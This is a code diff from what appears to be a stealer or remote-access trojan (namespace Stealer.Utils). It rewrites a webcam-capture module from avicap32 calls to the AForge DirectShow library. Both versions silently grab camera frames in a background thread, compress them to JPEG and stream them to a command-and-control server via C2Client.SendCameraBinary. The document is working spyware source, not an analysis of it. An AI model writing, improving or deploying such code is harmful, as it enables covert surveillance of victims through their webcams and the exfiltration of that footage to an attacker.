@@ -2,251 +2,127 @@ using System;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Runtime.InteropServices;
 using System.Threading;
+using AForge.Video.DirectShow;
 
 namespace Stealer.Utils
 {
     public static class CameraStream
     {
-        private static Thread _captureThread;
+        private static VideoCaptureDevice _device;
         private static volatile bool _running;
-
-        // DirectShow / capCreateCaptureWindowA via avicap32.dll
-        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA", CharSet = CharSet.Ansi)]
-        private static extern IntPtr capCreateCaptureWindowA(
-            string lpszWindowName,
-            int dwStyle,
-            int x, int y,
-            int nWidth, int nHeight,
-            IntPtr hWndParent,
-            int nID);
-
-        // capGetDriverDescriptionA via avicap32.dll
-        [DllImport("avicap32.dll", EntryPoint = "capGetDriverDescriptionA", CharSet = CharSet.Ansi)]
-        private static extern bool capGetDriverDescriptionA(
-            ushort wDriverIndex,
-            [Out] byte[] lpszName,
-            int cbName,
-            [Out] byte[] lpszVer,
-            int cbVer);
-
-        [DllImport("user32.dll")]
-        private static extern bool DestroyWindow(IntPtr hWnd);
-
-        [DllImport("user32.dll", EntryPoint = "SendMessageA")]
-        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
-
-        [DllImport("user32.dll")]
-        private static extern bool OpenClipboard(IntPtr hWndNewOwner);
-
-        [DllImport("user32.dll")]
-        private static extern bool EmptyClipboard();
-
-        [DllImport("user32.dll")]
-        private static extern IntPtr GetClipboardData(uint uFormat);
-
-        [DllImport("user32.dll")]
-        private static extern bool CloseClipboard();
-
-        private const uint WM_CAP_START = 0x0400;
-        private const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
-        private const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
-        private const uint WM_CAP_EDIT_COPY = WM_CAP_START + 30;
-        private const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
-        private const uint CF_BITMAP = 2;
-
-        private static int _selectedCamIndex = 0;
+        private static readonly object _lock = new object();
 
         public static string GetCameraListJson()
         {
-            // DirectShow COM requires STA — run on dedicated STA thread
-            string result = "[]";
-            var t = new Thread(() => { result = EnumerateCamerasOnSta(); });
-            t.SetApartmentState(ApartmentState.STA);
-            t.IsBackground = true;
-            t.Start();
-            t.Join(8000);
-            return result;
-        }
-
-        private static string EnumerateCamerasOnSta()
-        {
             var list = new System.Collections.Generic.List<string>();
-
-            // Primary: registry — covers all DirectShow devices (OBS Virtual Camera, physical webcams, etc.)
-            // Check both HKLM and HKCU since some virtual devices register per-user
-            const string regPath = @"SOFTWARE\Classes\CLSID\{860BB310-5D01-11d0-BD3B-00A0C911CE86}\Instance";
-            var hives = new[] { Microsoft.Win32.Registry.LocalMachine, Microsoft.Win32.Registry.CurrentUser };
-            int index = 0;
-            foreach (var hive in hives)
+            try
             {
-                try
+                var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                for (int i = 0; i < devices.Count; i++)
                 {
-                    using (var key = hive.OpenSubKey(regPath))
-                    {
-                        if (key == null) continue;
-                        foreach (string sub in key.GetSubKeyNames())
-                        {
-                            try
-                            {
-                                string name = null;
-                                using (var devKey = key.OpenSubKey(sub))
-                                    name = devKey?.GetValue("FriendlyName") as string;
-
-                                if (string.IsNullOrWhiteSpace(name))
-                                {
-                                    using (var clsidKey = hive.OpenSubKey(@"SOFTWARE\Classes\CLSID\" + sub))
-                                        name = clsidKey?.GetValue("FriendlyName") as string
-                                            ?? clsidKey?.GetValue("") as string;
-                                }
-
-                                if (!string.IsNullOrWhiteSpace(name))
-                                {
-                                    name = name.Trim().Replace("\\", "\\\\").Replace("\"", "\\\"");
-                                    list.Add("{\"id\":" + index + ",\"name\":\"" + name + "\"}");
-                                    index++;
-                                }
-                            }
-                            catch { }
-                        }
-                    }
+                    string name = (devices[i].Name ?? "Camera #" + i).Trim()
+                        .Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    list.Add("{\"id\":" + i + ",\"name\":\"" + name + "\"}");
                 }
-                catch { }
             }
-
-
-            // Fallback: WMI (physical cameras only, not virtual)
-            if (list.Count == 0)
-            {
-                try
-                {
-                    using (var s = new System.Management.ManagementObjectSearcher(
-                        "SELECT * FROM Win32_PnPEntity WHERE PNPClass = 'Camera' OR PNPClass = 'Image'"))
-                    {
-                        int idx = 0;
-                        foreach (var d in s.Get())
-                        {
-                            string caption = d["Caption"]?.ToString();
-                            if (!string.IsNullOrEmpty(caption))
-                            {
-                                caption = caption.Replace("\\", "\\\\").Replace("\"", "\\\"");
-                                list.Add("{\"id\":" + idx + ",\"name\":\"" + caption + "\"}");
-                                idx++;
-                            }
-                        }
-                    }
-                }
-                catch { }
-            }
-
+            catch { }
             return "[" + string.Join(",", list.ToArray()) + "]";
         }
 
         public static void Start(int fps, int quality, int camIndex = 0)
         {
-            if (_running) Stop();
-            _selectedCamIndex = camIndex;
+            Stop();
             _running = true;
-            _captureThread = new Thread(() => CaptureLoop(fps, quality)) { IsBackground = true };
-            _captureThread.Start();
+            var t = new Thread(() => CaptureLoop(fps, quality, camIndex)) { IsBackground = true };
+            t.SetApartmentState(ApartmentState.STA);
+            t.Start();
         }
 
         public static void Stop()
         {
             _running = false;
-        }
-
-        private static void CaptureLoop(int fps, int quality)
-        {
-            int delay = 1000 / Math.Max(fps, 1);
-            IntPtr hCap = IntPtr.Zero;
-
-            try
+            lock (_lock)
             {
-                // Create capture window
-                hCap = capCreateCaptureWindowA("CapWindow", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
-                if (hCap == IntPtr.Zero)
-                {
-                    _running = false;
-                    return;
-                }
-
-                // Connect to chosen camera index
-                IntPtr connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)_selectedCamIndex, IntPtr.Zero);
-                if (connected == IntPtr.Zero)
-                {
-                    // Fallback to any active driver 0..9
-                    for (int i = 0; i < 10; i++)
-                    {
-                        if (i == _selectedCamIndex) continue;
-                        connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)i, IntPtr.Zero);
-                        if (connected != IntPtr.Zero) break;
-                    }
-                }
-
-                if (connected == IntPtr.Zero)
-                {
-                    DestroyWindow(hCap);
-                    _running = false;
-                    return;
-                }
-
-                var jpegEncoder = GetJpegEncoder();
-                var qualityParam = new EncoderParameters(1);
-                qualityParam.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Max(10, Math.Min(quality, 100)));
-
-                while (_running)
+                if (_device != null)
                 {
                     try
                     {
-                        // 1. Grab fresh video frame from camera hardware
-                        SendMessage(hCap, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
-                        // 2. Copy grabbed frame to clipboard bitmap
-                        SendMessage(hCap, WM_CAP_EDIT_COPY, IntPtr.Zero, IntPtr.Zero);
+                        if (_device.IsRunning) { _device.SignalToStop(); _device.WaitForStop(); }
+                    }
+                    catch { }
+                    _device = null;
+                }
+            }
+        }
 
-                        if (OpenClipboard(IntPtr.Zero))
+        private static void CaptureLoop(int fps, int quality, int camIndex)
+        {
+            int delay = 1000 / Math.Max(fps, 1);
+            try
+            {
+                var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                if (devices.Count == 0) { _running = false; return; }
+                if (camIndex >= devices.Count) camIndex = 0;
+
+                var jpegEncoder = GetJpegEncoder();
+                var encParams = new EncoderParameters(1);
+                encParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Max(10, Math.Min(quality, 100)));
+
+                byte[] pending = null;
+                var frameLock = new object();
+
+                lock (_lock)
+                {
+                    _device = new VideoCaptureDevice(devices[camIndex].MonikerString);
+                    _device.NewFrame += (sender, e) =>
+                    {
+                        if (!_running) return;
+                        try
                         {
-                            IntPtr hBitmap = GetClipboardData(CF_BITMAP);
-                            if (hBitmap != IntPtr.Zero)
+                            using (var bmp = (Bitmap)e.Frame.Clone())
                             {
-                                using (Bitmap bmp = Image.FromHbitmap(hBitmap))
+                                int w = bmp.Width, h = bmp.Height;
+                                if (w > 640 || h > 480)
                                 {
-                                    using (MemoryStream ms = new MemoryStream())
+                                    float scale = Math.Min(640f / w, 480f / h);
+                                    w = (int)(w * scale); h = (int)(h * scale);
+                                }
+                                using (var scaled = new Bitmap(w, h))
+                                using (var g = Graphics.FromImage(scaled))
+                                {
+                                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
+                                    g.DrawImage(bmp, 0, 0, w, h);
+                                    using (var ms = new MemoryStream())
                                     {
-                                        bmp.Save(ms, jpegEncoder, qualityParam);
-                                        byte[] data = ms.ToArray();
-                                        if (data != null && data.Length > 0)
-                                        {
-                                            C2Client.SendCameraBinary(data);
-                                        }
+                                        scaled.Save(ms, jpegEncoder, encParams);
+                                        lock (frameLock) { pending = ms.ToArray(); }
                                     }
                                 }
                             }
-                            CloseClipboard();
                         }
-                    }
-                    catch { }
-
-                    Thread.Sleep(delay);
+                        catch { }
+                    };
+                    _device.Start();
                 }
 
-                SendMessage(hCap, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
-                DestroyWindow(hCap);
+                while (_running)
+                {
+                    byte[] frame = null;
+                    lock (frameLock) { frame = pending; pending = null; }
+                    if (frame != null && frame.Length > 0)
+                        C2Client.SendCameraBinary(frame);
+                    Thread.Sleep(delay);
+                }
             }
-            catch
-            {
-                if (hCap != IntPtr.Zero) DestroyWindow(hCap);
-                _running = false;
-            }
+            catch { }
+            finally { Stop(); }
         }
 
         private static ImageCodecInfo GetJpegEncoder()
         {
             foreach (var codec in ImageCodecInfo.GetImageEncoders())
-            {
                 if (codec.MimeType == "image/jpeg") return codec;
-            }
             return null;
         }
     }
